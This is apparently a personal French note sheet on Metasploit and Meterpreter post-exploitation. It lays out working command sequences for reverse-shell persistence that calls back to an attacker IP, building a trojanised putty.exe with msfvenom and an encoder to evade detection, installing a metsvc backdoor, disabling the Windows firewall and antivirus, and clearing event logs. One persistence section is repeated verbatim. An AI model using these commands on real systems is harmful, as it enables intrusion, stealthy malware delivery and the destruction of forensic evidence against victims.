Pour mettre à jour le firmware directement dedans : apt update.

Pour rechercher un exploit sur ssh, par exemple, exécutez la commande searchsploit ssh.

Attention, search ≠ searchsploit. Searchsploit sert à trouver des exploits dans Exploit Database alors que search va chercher des exploits, auxiliaires... dans les fichiers locaux.

Étapes importantes : search → use → info → show payloads (pour savoir quel type de remote control on veut) → set path/to/payloads.

Dans la session meterpreter, faites background pour revenir dans msfconsole, sessions pour voir toutes les sessions et sessions -i 1 pour retourner à la session 1.

Stages : payloads qui contient des fonctionnalités (keylog, capture d'écran...)

Stagers : payloads qui établit la connexion avec la cible. On peut ensuite charger des stages.

Singles : exécutables autonomes qui établit une connexion puis établit une taches spécifique. Par contre c'est tout, il fera rien d'autre donc pas de session. Mais il est bien si tu dois faire une taches spécifique sans sessions en étant discret.

Quand on est dans un contexte d'exploit, on peut faire la commande check pour vérifier si la cible est vulnérable. Pas tous les modules ont cette fonctionnalité.


# Search

Pour rechercher une catégorie de modules (auxiliary, encoder, evasion, exploit, nops, payload, post) :
- `search type:payload`

Pour spécifier la platforme :
- `search platform:windows`

Pour spécifier l'architecture :
- `search arch:x64`

Pour rechercher un nom spécifique :
- `search reverse`

Pour rechercher les modules spécifiques à une CVE :
- `search cve:CVE-2022-27925`

Pour spécifier le rank (s'il est bien/fiable) :
- `search rank:good`

Pour voir les modules qui peuvent peut-être affecter la machine :
- `search target`

# Searchsploit

Pour chercher des exploits kernel : searchsploit linux kernel 5. // où 5 c'est le premier chiffre de la version du kernel cible

Pour copier l'exploit qu'on veut (à toujours faire quand on en utilise un pour pas changer l'exploit originale) : searchsploit -m exploit_file

# Meterpreter

Une fois qu'on a une session ouverte avec la cible, on peut :

Obtenir un shell stable :

migrate : Migrer le processus meterpreter vers un processus si possible toujours exécuter sur la cible.

liste des processus vers lesquelles migrer (cherche sur internet pour voir à quoi correspondent-ils):

[explorer.exe](https://www.malekal.com/explorateur-windows-explorer-exe/ "https://www.malekal.com/explorateur-windows-explorer-exe/") ; [svchost.exe](https://www.avast.com/fr-fr/c-what-is-svchost-file "https://www.avast.com/fr-fr/c-what-is-svchost-file") ; [spoolsv.exe](https://recoverit.wondershare.fr/computer/spoolsv-exe.html#:~:text=Le%20spoolsv.exe%20est%20un,d%27attente%20dans%20le%20syst%C3%A8me. "https://recoverit.wondershare.fr/computer/spoolsv-exe.html#:~:text=Le%20spoolsv.exe%20est%20un,d'attente%20dans%20le%20syst%C3%A8me.") ; [services.exe](https://www.processlibrary.com/fr/directory/files/services/24770/ "https://www.processlibrary.com/fr/directory/files/services/24770/") ; [lsass.exe](https://www.malekal.com/lsass-exe/ "https://www.malekal.com/lsass-exe/")

shell : permet d'avoir un shell normal. Comme si je lancais un shell sur windows par exemple.

run persistence : Permet d'avoir un shell persistent qui se reconnecte quand la cible rallume la machine.

- –A switch starts a matching handler to connect to the agent.
- With the -L switch we tell the system where to place the Meterpreter on the target system.
- The –P switch tells the system what payload to use (Windows/Meterpreter/reverse_tcp is the default, so we won’t use this switch).
- -S starts the agent on boot with system privileges.
- The -U switch starts the agent when the user (U) logs on.
- The -x switch starts the agent when the system boots.
- With the –i switch we can indicate the time interval between each connection attempt.
- The -p switch indicates the port, and finally…
- The –r switch indicates the IP address of our ( r ) system running Metasploit.

commande interréssante : run persistence –A –L c:\ -S -X  -i 10 –p 443 –r [192.168.1.113](http://192.168.1.113 "http://192.168.1.113")

Pour tester si ca marche : faire la commande reboot dans meterpreter, si c'est bon, le meterpreter shell va se reconnecter.

Énumérer :

Informations système :

- sysinfo : Informations système de la cible.
- run scraper : Donne des informations variées sur le système cible (service, hash...). Son avantage, c'est qu'il les stocke dans .msf4/logs/script/scraper bien rangé.

Processus :

- getpid : PID (Identifiant de Processus) de la session Meterpreter sur la machine cible.
- ps : Affiche tous les processus en cours (vérifier le PID de Meterpreter).

Sécurité et environnement :

- run checkvm : Vérifie si la cible s'exécute sur une machine virtuelle.
- run getcountermeasure : Informations sur les contre-mesures de sécurité (pare-feu, filtres, etc.).
- run get_env : Informations sur l'environnement (chemin d'accès, architecture, etc.).

Réseau :

- idletime : Vérifie si la cible est active.
- ipconfig/ifconfig : Affiche la configuration IP de la cible.
- route : Affiche les routes utilisées par les paquets réseau.
- run get local subnets : Affiche le masque réseau.
- run getgui : Informations sur l'interface graphique de la cible (fenêtres ouvertes, etc.).

Manipulation du fichier "hosts" :

- run hostsedit : Modifie le fichier "hosts" pour associer des noms de domaine à des adresses IP (possibilité de redirection). [https://www.darkoperator.com/blog/2009/6/14/hostsedit-meterpreter-script.html](https://www.darkoperator.com/blog/2009/6/14/hostsedit-meterpreter-script.html "https://www.darkoperator.com/blog/2009/6/14/hostsedit-meterpreter-script.html")

Utilisateurs et applications :

- run enum_logged_on_users : Liste les utilisateurs connectés.
- run get_application_list : Liste les applications en cours d'exécution.

Windows spécifique :

- run windows/gather/forensics/enum_drives : Liste les pilotes de périphériques et leur taille (Windows uniquement).
- run windows/gather/enum_ms_product_keys : Affiche la clé de produit Windows.
- run windows/gather/credentials/windows_autologin : Vérifie si la cible se connecte automatiquement sans mot de passe.
- run winenum : Enumère des informations précieuses (résultats stockés dans /root/.msf4/logs/scripts/winenum/).

Effacer les traces (évasion) :

### Désactiver le firewall :

1. Dans un shell :
    
    - netsh firewall show opmode : Pour simplement voir la configurations du firewall.
    - netsh firewall set opmode mode=disable : Désactiver le firewall windows.

### Désactiver l'antivirus :

- run killav : désactive les processus des antivirus.
    
- Désactiver l'antivirus au démarrage :
    
    1. Sur windows, tasklist /svc puis trouver le/les processus de l'antivirus (avg par exemple)
        
    2. sc queryex avgwd (par exemple) pour afficher propriété du service. On peut voir le state (not_stoppable, not_pausable...)
        
    3. Pour chaque processus de l'antivirus, faire sc config avgwd start= disabled
        
    4. Enfin, pour tester si ça fonctionne, retourner dans meterpreter (exit) puis faire reboot.
        
    5. Si en faisant tasklist /svc il reste des processus avg (ou autre antivirus), pas grave, faut juste les kill. Par exemple, faire la commande taskkill /F /IM "avg*" va stopper directement les processus sans avertissement.
        

### Supprimer les logs (après avoir désactiver le fw et l'av :

- clearev : Dans meterpreter, pour sup tout les logs.

BackDoor :

Première backdoor :

On utilise msfvenom pour charger le payload, l'encoder pour ne pas qu'il se fasse repéré trop facilement par les firewall ou autre. Puis l'implémenter.

[msfvenomoptions.txt](file:///home/wpkaliuser/.config/joplin-desktop/resources/d42ab51e94e42507263eda8461879caf.txt "file:///home/wpkaliuser/.config/joplin-desktop/resources/d42ab51e94e42507263eda8461879caf.txt")

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.105 -e x86/shikata_ga_nai -i 6 -f exe -x /root/Desktop/putty.exe -o /root/Desktop/virusputty.exe`

Explication de la commande :

- -p spécifie le payload à utiliser, dans ce cas, windows/meterpreter/reverse_tcp (c'est ce qui permettra de se reconnecter à la cible).
- LHOST spécifie votre adresse IP.
- -e spécifie l'encodeur à utiliser, dans ce cas, x86/shikata_ga_nai. show encoders pour voir
- -i spécifie le nombre d'itérations pour l'encodeur.
- -f spécifie le format de sortie, dans ce cas, exe.
- -x spécifie le fichier exécutable existant à utiliser comme exécutable hôte (ici, putty.exe).
- -o spécifie le nom du fichier de sortie.

Après ca, la cible doit la télécharger.

Pour voir si elle fonctionne, il faut quitter metasploit pour se deco de la target. Ensuite, en retournant sur metasploit, faire la commande use exploit/multi/handler, set payload/que/jai/utilisé, mettre l'adresse target en lhost puis faire exploit.

Seconde backdoor :

On utilise le module metsvc pour installer une backdoor dans les processus de la target. On pourra donc y acceder dès que la target est up.

Dans la session meterpreter, faire run metsvc -h pour voir les options ou juste run metsvc pour installer le service sur la target.

Le service attend alors une connexion. On va donc, en dehors de meterpreter (peut etre un autre jour oú la target est up), faire use exploit/multi/handler, utilise un payload metsvc (y'en a plusieurs) puis désigner le lport (31337 par exemple) et le rhost. Tu peux faire show options pour voir. Enfin, faire exploit.

A la fin de l'instrusion, retirer le programme de la cible en faisant run metsvc -r sur le shell meterpreter

Troisième backdoor :

run persistence : Permet d'avoir un shell persistent qui se reconnecte quand la cible rallume la machine.

- –A switch starts a matching handler to connect to the agent.
- With the -L switch we tell the system where to place the Meterpreter on the target system.
- The –P switch tells the system what payload to use (Windows/Meterpreter/reverse_tcp is the default, so we won’t use this switch).
- -S starts the agent on boot with system privileges.
- The -U switch starts the agent when the user (U) logs on.
- The -x switch starts the agent when the system boots.
- With the –i switch we can indicate the time interval between each connection attempt.
- The -p switch indicates the port, and finally…
- The –r switch indicates the IP address of our ( r ) system running Metasploit.

commande interréssante : run persistence –A –L c:\ -S -X  -i 10 –p 443 –r [192.168.1.113](http://192.168.1.113 "http://192.168.1.113")

Pour tester si ca marche : faire la commande reboot dans meterpreter, si c'est bon, le meterpreter shell va se reconnecter.